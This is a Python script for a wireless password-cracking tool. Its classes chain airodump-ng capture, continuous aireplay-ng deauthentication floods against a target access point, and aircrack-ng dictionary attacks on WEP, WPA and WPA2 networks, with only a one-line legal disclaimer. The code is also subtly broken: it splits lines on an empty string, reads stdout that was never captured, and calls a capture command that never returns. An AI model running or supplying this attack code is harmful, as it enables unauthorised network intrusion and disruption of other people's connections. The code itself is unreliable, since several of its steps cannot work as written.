"""
Wireless Password Cracker

This script contains classes and methods for cracking wireless network passwords using different security protocols such as WEP, WPA, and WPA2. It utilizes tools like airodump-ng, aireplay-ng, and aircrack-ng for capturing network traffic and performing dictionary attacks.

Classes:
- WirelessEaterFactory: Factory for creating wireless network password cracker instances.
- WirelessEaterBase: Abstract base class for wireless password crackers.
- WEPCracker: Cracks WEP wireless network passwords.
- WPACracker: Cracks WPA wireless network passwords.
- WPA2Cracker: Cracks WPA2 wireless network passwords.

Usage:
1. Choose the type of wireless password cracker (e.g., "wep", "wpa", "wpa2").
2. Provide the path to a password dictionary file.
3. Execute the selected cracker to attempt to crack the wireless network password.

This script is intended for educational and testing purposes only. Unauthorized use may violate laws and regulations.

"""

from abc import ABC, abstractmethod
from subprocess import run

class WirelessEaterFactory:
    """
    Wireless Factory Class
    """
    def generate_wireless_factory(cracker_type):
        """Factory for creating wireless network password cracker instances.

        Args:
            cracker_type (str): The type of wireless password cracker to create (e.g., "wep", "wpa", "wpa2").

        Returns:
            WirelessEaterBase: An instance of the selected wireless password cracker.
        """
        cracker_class = {
            "wep": WEPCracker(),
            "wpa": WPACracker(),
            "wpa2": WPA2Cracker()
        }
        return cracker_class[cracker_type]

class WirelessEaterBase():
    """
    Wireless Eater Base Abstact Class
    """
    @abstractmethod
    def crack(self, dictionary_path):
        """Abstract method for cracking wireless network passwords.

        Args:
            dictionary_path (str): The path to the password dictionary file.

        This method should be implemented in derived classes to perform the password cracking for the specific wireless security type (WEP, WPA, or WPA2).
        """
        pass

class WEPCracker(WirelessEaterBase):
    """
    Wireless Eater WEP Cracker Class
    """
    def crack(self, dictionary_path):
        """Crack WEP wireless network password using airodump-ng and aircrack-ng.

        Args:
            dictionary_path (str): The path to the password dictionary file.

        This method cracks WEP wireless network passwords by capturing network traffic and using a dictionary attack.
        """
        print("You've selected the 'wireless-eater' module for wireless network scanning and password cracking for WEP.")
        try:
            run(["airodump-ng", "--bssid", "<BSSID>", "--channel", "<CHANNEL>", "-w", "output_file", "wlan0"], text=True, check=True)
            run(["aireplay-ng", "--deauth", "0", "-a", "<BSSID>", "wlan0"], text=True, check=True)
            result = run(["aircrack-ng", "output_file-01.cap", "-w", dictionary_path], text=True, check=True)
            output = result.stdout

            def generate_result_list():
                lines = output.split('\n')
                for line in lines:
                    yield line
            
            gen_instance = generate_result_list()

            for line in gen_instance:
                if "KEY FOUND" in line:
                    parts = line.split("")
                    password = parts[2]
                    print(f"Eater fund password: {password}")
        except Exception as e:
            print(f"An error occurred: {e}")
            
class WPACracker(WirelessEaterBase):
    """
    Wireless Eater WPA Cracker Class
    """
    def crack(self, dictionary_path):
        """Crack WPA wireless network password using airodump-ng and aircrack-ng.

        Args:
            dictionary_path (str): The path to the password dictionary file.

        This method cracks WPA wireless network passwords by capturing network traffic and using a dictionary attack.
        """
        print("You've selected the 'wireless-eater' module for wireless network scanning and password cracking for WPA.")
        try:
            run(["airodump-ng", "--bssid", "<BSSID>", "--channel", "<CHANNEL>", "-w", "output_file", "wlan0"], text=True, check=True)
            run(["aireplay-ng", "--deauth", "0", "-a", "<BSSID>", "wlan0"], text=True, check=True)
            result = run(["aircrack-ng", "output_file-01.cap", "-w", dictionary_path], text=True, check=True)
            output = result.stdout

            def generate_result_list():
                lines = output.split('\n')
                for line in lines:
                    yield line

            gen_instance = generate_result_list()

            for line in gen_instance:
                if "KEY FOUND" in line:
                    parts = line.split("")
                    password = parts[2]
                    print(f"Eater fund password: {password}")
        except Exception as e:
            print(f"An error occured: {e}")

class WPA2Cracker(WirelessEaterBase):
    """
    Wireless Eater WPA2 Cracker Class
    """
    def crack(self, dictionary_path):
        """Crack WPA2 wireless network password using airodump-ng and aircrack-ng.

        Args:
            dictionary_path (str): The path to the password dictionary file.

        This method cracks WPA2 wireless network passwords by capturing network traffic and using a dictionary attack.
        """
        print("You've selected the 'wireless-eater' module for wireless network scanning and password cracking for WPA2.")
        try:
            run(["airodump-ng", "--bssid", "<BSSID>", "--channel", "<CHANNEL>", "-w", "output_file", "wlan0"], text=True, check=True)
            run(["aireplay-ng", "--deauth", "0", "-a", "<BSSID>", "wlan0"], text=True, check=True)
            result = run(["aircrack-ng", "output_file-01.cap", "-w", dictionary_path], text=True, check=True)
            output = result.stdout

            def generate_result_list():
                lines = output.split("\n")
                for line in lines:
                    yield line

            gen_instance = generate_result_list()

            for line in gen_instance:
                if "KEY FOUND" in line:
                    parts = line.split("")
                    password = parts[2]
                    print(f"Eater fund password: {password}")
        except Exception as e:
            print(f"An error occured: {e}")